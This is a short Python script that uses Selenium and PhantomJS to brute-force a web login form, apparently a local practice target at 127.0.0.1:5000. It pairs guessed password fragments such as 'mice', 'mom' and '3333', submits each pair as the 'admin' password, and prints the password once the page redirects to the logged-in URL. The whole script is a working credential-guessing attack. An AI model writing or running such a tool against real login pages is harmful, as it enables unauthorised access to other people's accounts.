import itertools, time
from selenium import webdriver
import selenium.webdriver.chrome.service as service
from selenium.webdriver.common.keys import Keys
# Initialize browse object
# 
## Launch Webdriver plus Chromedriver
service = service.Service('/usr/local/bin/chromedriver')
service.start()
capabilities = {'chrome.binary': '/path/to/custom/chrome'}
#
potential_passwords = ['mice', 'mom','dad', '1003','0332','3333']
combinations = list( itertools.permutations(potential_passwords,2) )

'''
# driver = webdriver.Remote(service.service_url, capabilities)
driver = webdriver.PhantomJS()
driver.get('http://127.0.0.1:5000')
print(driver.current_url)
email_input = driver.find_element_by_id('username')
email_input.send_keys('admin')
password_input = driver.find_element_by_id('password')
password_input.send_keys('mice3333')
submit = driver.find_element_by_id('submit')
submit.click()
# time.sleep(10)
print(driver.current_url)
## driver.quit()
'''

for x in combinations:
	driver = webdriver.PhantomJS()
	driver.get('http://127.0.0.1:5000')
	email_input = driver.find_element_by_id('username')
	email_input.send_keys('admin')
	password_input = driver.find_element_by_id('password')
	password_input.send_keys(''.join(x))
	submit = driver.find_element_by_id('submit')
	submit.click()
	if driver.current_url == 'http://127.0.0.1:5000/loggedin':
		print('!!!SUCCESS!!!')
		print("user's password: " +''.join(x))
	
	driver.quit()

